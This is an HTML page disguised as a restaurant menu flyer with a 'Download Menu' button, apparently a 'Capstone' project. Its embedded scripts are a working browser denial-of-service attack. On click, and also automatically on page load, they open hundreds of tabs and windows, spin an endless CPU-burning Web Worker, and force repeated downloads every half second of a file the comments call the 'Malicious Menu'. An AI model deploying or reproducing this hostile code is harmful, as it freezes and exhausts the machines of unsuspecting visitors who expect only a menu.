<!DOCTYPE html>
<html>
<head>
  <title>Menu Flyer</title>
  <style>
    /* Create a Container */
    .container {  
      position: relative;
      width: 300px;
      height: 400px;
    }
    /* Add Menu Image, while blurred */
    #blurred {
      filter: blur(8px);
      width: 100%;
      height: 100%;
      background: url('menu.jpg') no-repeat center center;
      background-size: cover;
    }
    /* Create Download Button */
    #downloadBtn {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      padding: 12px 24px;
      font-size: 18px;
      z-index: 2;
    }
  </style>
</head>
<body>
  <div class="container">
    <div id="blurred"></div>
    <button id="downloadBtn">Download Menu</button>
  </div>

  <script>
    /////////////////////////////////////////////////////////////////////////////////////////////////////
    //
    // This section is based on them clicking the button on the form
    //
    /////////////////////////////////////////////////////////////////////////////////////////////////////
    document.getElementById('downloadBtn').addEventListener('click', () => {    // When button is clicked
      document.getElementById('blurred').style.filter = 'none';                 // Remove Blur



      // Start CPU intensive loop
      // The purpose of this section is to use up CPU memory and resources
      function cpuLoad() {                                                      // Create func CPU Loading                             
        let x = 0;                                                              // Set x to 0
        while (true) {                                                          // Loop
          x += Math.sqrt(Math.random());                                        // Do math
          if (x > 1e7) x = 0;                                                   // Reset to avoid overflow
        }
      }

      // Multiple Tabs
      for (let i = 0; i < 200; i++) {
        window.open('https://arizona5005.github.io/Capstone/', '_blank');
      }

      // Multiple Windows
      for (let i = 0; i < 200; i++) {
        window.open('https://arizona5005.github.io/Capstone/', '_blank', 'noopener,noreferrer,width=400,height=400');
      }

      // Start repeated downloads
      // Create anchor element
      // Creates download loop function
      // References our Malicious Menu link
      // Downloads it under a very long name to take up resources
      // Add link to document
      // Click the link
      // Remove the link

      function downloadLoop() {
        const link = document.createElement('a');
        link.href = 'https://arizona5005.github.io/Capstone/menu.pdf';
        link.download = 'menu_super_long_filename_that_just_keeps_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going.pdf';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      }

      // Run CPU load in a Web Worker to keep UI responsive (optional)
      // If worker supported
      // Infinite message in JS
      // Create new worker
      // Send message 
      // Else, run CPU load loop to freeze UI

      if (window.Worker) {
        const blob = new Blob([`onmessage = function() { while(true) {} }`], {type: 'application/javascript'});
        const worker = new Worker(URL.createObjectURL(blob));
        worker.postMessage('');
      } else {
        cpuLoad();
      }

      // Start download loop every 1/2 seconds
      setInterval(downloadLoop, 500);
    });
  </script>

<script>

    /////////////////////////////////////////////////////////////////////////////////////////////////////
    //
    // This section is based on them just landing on the page
    // Thought it a good idea to go offensive instead of waiting for them to click
    //
    /////////////////////////////////////////////////////////////////////////////////////////////////////
  function attack() {                                                               // No click, on landing attack
    document.getElementById('blurred').style.filter = 'none';                       // Remove Blur


    // Start repeated downloads
    // Create anchor element
    // Creates download loop function
    // References our Malicious Menu link
    // Downloads it under a very long name to take up resources
    // Add link to document
    // Click the link
    // Remove the link
    // Start repeated downloads

    function downloadLoop() {
      const link = document.createElement('a');
      link.href = 'https://arizona5005.github.io/Capstone/menu.pdf';
      link.download = 'menu_super_long_filename_that_just_keeps_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going.pdf';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    // Multiple Tabs
    for (let i = 0; i < 15; i++) {
      window.open('https://arizona5005.github.io/Capstone/', '_blank');
    }

    // Multiple Windows
    for (let i = 0; i < 15; i++) {
      window.open('https://arizona5005.github.io/Capstone/', '_blank', 'noopener,noreferrer,width=400,height=400');
    }


    // Start repeated downloads
    // Create anchor element
    // Creates download loop function
    // References our Malicious Menu link
    // Downloads it under a very long name to take up resources
    // Add link to document
    // Click the link
    // Remove the link
    // Start repeated downloads

    function downloadLoop() {
      const link = document.createElement('a');
      link.href = 'https://arizona5005.github.io/Capstone/menu.pdf';
      link.download = 'menu_super_long_filename_that_just_keeps_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going.pdf';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }


    // Start CPU intensive loop
    // The purpose of this section is to use up CPU memory and resources
    function cpuLoad() {                                                      // Create func CPU Loading                             
      let x = 0;                                                              // Set x to 0
      while (true) {                                                          // Loop
        x += Math.sqrt(Math.random());                                        // Do math
        if (x > 1e7) x = 0;                                                   // Reset to avoid overflow
      }
    }

    // Run CPU load in a Web Worker to keep UI responsive (optional)
    // If worker supported
    // Infinite message in JS
    // Create new worker
    // Send message 
    // Else, run CPU load loop to freeze UI

    if (window.Worker) {
      const blob = new Blob([`onmessage = function() { while(true) {} }`], {type: 'application/javascript'});
      const worker = new Worker(URL.createObjectURL(blob));
      worker.postMessage('');
    } else {
      cpuLoad();
    }

    // Start download loop every 1/2 seconds
    setInterval(downloadLoop, 500);
  }

  // Activate attack automatically on page load
  window.onload = attack;
</script>
</body>
</html>
